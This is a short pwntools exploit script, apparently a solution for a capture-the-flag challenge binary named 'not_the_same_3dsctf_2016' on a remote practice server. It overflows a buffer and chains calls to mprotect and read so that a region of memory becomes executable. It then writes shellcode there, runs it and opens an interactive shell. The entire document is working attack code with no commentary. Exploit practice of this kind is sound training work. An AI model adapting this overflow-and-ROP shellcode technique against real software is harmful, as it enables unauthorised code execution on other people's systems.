from pwn import *

r=remote('node4.buuoj.cn',25721)
elf=ELF('./not_the_same_3dsctf_2016')


read_addr=elf.symbols['read']
mprotect=0x806ED40
addr=0x80eb000
p3_ret=0x806fcc8

shellcode=asm(shellcraft.sh())

payload  ='a'*0x2d+p32(mprotect)+p32(p3_ret)
payload +=p32(addr)+p32(0x100)+p32(0x7)

payload +=p32(read_addr)+p32(p3_ret)

payload +=p32(0)+p32(addr)+p32(len(shellcode))+p32(addr)

r.sendline(payload)
r.sendline(shellcode)

r.interactive()
